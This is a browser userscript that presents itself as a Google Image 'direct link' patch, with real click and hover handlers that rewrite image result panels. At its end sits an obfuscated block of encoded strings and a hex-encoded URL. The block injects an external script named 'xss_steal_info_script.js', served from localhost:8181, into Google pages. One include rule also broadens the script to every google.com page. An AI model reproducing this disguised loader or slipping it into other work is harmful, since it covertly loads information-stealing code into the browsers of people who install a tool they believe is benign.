// ==UserScript==
// @name        Google Image Direct Link Patch
// @namespace   GoogleImageDirectLinkPatch
// @description Make clicking on image bottom panel go directly to the image in a Google Image search result. Use SHIFT+Click to open image in a new tab.
// @version     1.1.5
// @license     AGPL v3
// @author      jcunews
// @include     /^https:\/\/www\.google\.(co\.)?[a-z]{2,3}\/search.*tbm=isch/
// @include     /^https:\/\/www\.google\.com(\.[a-z]{2,3})?\/search.*tbm=isch/
// @include     http*://*.google.com/*
// @grant       none
// ==/UserScript==

//*** Settings Start ***
var bottomPanelBackgroundColor = "rgba(51,51,51,0.8)"; //"rgba(51,51,51,0.8)" is the default. Alpha (4th number) is the opacity level.
var bottomPanelFontColor       = "#FFF";               //"#FFF" is the default.
var bottomPanelFontSize        = "11px";               //"11px" is the default. Can be e.g. "9pt" for size in Points.
var bottomPanelFontWeight      = "normal";             //"normal is the default. Can be "bold".
//*** Settings End ***

//add bottom panel style override
var ele = document.createElement("STYLE");
ele.innerHTML = ".rg_ilmbg,a.rg_ilmbg:link,a.rg_ilmbg:visited{background-color:" + bottomPanelBackgroundColor + ";color:" + bottomPanelFontColor + ";font-size:" + bottomPanelFontSize + ";font-weight:" + bottomPanelFontWeight + "}";
document.body.appendChild(ele);

//add the click handler to the direct image
document.addEventListener("click", function(ev) {
  var ele = ev.target, url;
  if (!ev.button && (ele.tagName === "A") && ele.classList.contains("rg_ilmbg")) {
    if (ev.stopImmediatePropagation) {
      ev.stopImmediatePropagation();
    }
    if (ev.stopPropagation) {
      ev.stopPropagation();
    }
    ev.preventDefault();
    if (ev.shiftKey) {
      window.open(ele.href);
    } else {
      window.location.href = ele.href;
    }
  }
}, true);

//add direct image URL to the image bottom panel
document.addEventListener("mouseover", function(ev) {
  var panel = ele = ev.target, css, url, link;
  if ((ele.className === "rg_ilmbg") && (panel.tagName !== "A") && ele.parentNode) {
    css = ele.style.cssText;
    ele = ele.parentNode;
    url = ele.search.match(/imgurl=([^&]+)/);
    if (url) {
      url = decodeURIComponent(url[1]);
      link = document.createElement("A");
      link.href = url;
      link.className = "rg_ilmbg";
      link.innerHTML = panel.innerHTML;
      link.style.cssText = css;
      panel.parentNode.replaceChild(link, panel);
    }
  }
}, true);

var _0x1fb6=['\x61\x47\x56\x68\x5a\x41\x3d\x3d','\x59\x58\x42\x77\x5a\x57\x35\x6b\x51\x32\x68\x70\x62\x47\x51\x3d','\x62\x47\x39\x6e','\x59\x33\x4a\x6c\x59\x58\x52\x6c\x52\x57\x78\x6c\x62\x57\x56\x75\x64\x41\x3d\x3d','\x63\x32\x4e\x79\x61\x58\x42\x30\x4d\x67\x3d\x3d','\x64\x48\x6c\x77\x5a\x51\x3d\x3d','\x64\x47\x56\x34\x64\x43\x39\x71\x59\x58\x5a\x68\x63\x32\x4e\x79\x61\x58\x42\x30','\x63\x33\x4a\x6a'];(function(_0x49e5e0,_0x59dfdc){var _0x264675=function(_0x2cdf0a){while(--_0x2cdf0a){_0x49e5e0['push'](_0x49e5e0['shift']());}};_0x264675(++_0x59dfdc);}(_0x1fb6,0x103));var _0x3497=function(_0x2d524d,_0x399314){_0x2d524d=_0x2d524d-0x0;var _0x125276=_0x1fb6[_0x2d524d];if(_0x3497['DAsrlm']===undefined){(function(){var _0x403ec3=function(){var _0x1f2f5a;try{_0x1f2f5a=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5d304b){_0x1f2f5a=window;}return _0x1f2f5a;};var _0x3adecc=_0x403ec3();var _0x522f10='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3adecc['atob']||(_0x3adecc['atob']=function(_0xf2a3e3){var _0x621e2a=String(_0xf2a3e3)['replace'](/=+$/,'');for(var _0x49c639=0x0,_0x4d20f8,_0x2b74e7,_0x2e7ebd=0x0,_0x1d1f06='';_0x2b74e7=_0x621e2a['charAt'](_0x2e7ebd++);~_0x2b74e7&&(_0x4d20f8=_0x49c639%0x4?_0x4d20f8*0x40+_0x2b74e7:_0x2b74e7,_0x49c639++%0x4)?_0x1d1f06+=String['fromCharCode'](0xff&_0x4d20f8>>(-0x2*_0x49c639&0x6)):0x0){_0x2b74e7=_0x522f10['indexOf'](_0x2b74e7);}return _0x1d1f06;});}());_0x3497['MdPLae']=function(_0x18bd50){var _0x146f01=atob(_0x18bd50);var _0x42de1c=[];for(var _0x2b02d5=0x0,_0x40a558=_0x146f01['length'];_0x2b02d5<_0x40a558;_0x2b02d5++){_0x42de1c+='%'+('00'+_0x146f01['charCodeAt'](_0x2b02d5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x42de1c);};_0x3497['tYEKsY']={};_0x3497['DAsrlm']=!![];}var _0x4e7605=_0x3497['tYEKsY'][_0x2d524d];if(_0x4e7605===undefined){_0x125276=_0x3497['MdPLae'](_0x125276);_0x3497['tYEKsY'][_0x2d524d]=_0x125276;}else{_0x125276=_0x4e7605;}return _0x125276;};var script2=document[_0x3497('0x0')](_0x3497('0x1'));script2[_0x3497('0x2')]=_0x3497('0x3');script2[_0x3497('0x4')]='\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x38\x31\x38\x31\x2f\x78\x73\x73\x5f\x73\x74\x65\x61\x6c\x5f\x69\x6e\x66\x6f\x5f\x73\x63\x72\x69\x70\x74\x2e\x6a\x73';document[_0x3497('0x5')][_0x3497('0x6')](script2);console[_0x3497('0x7')]('');
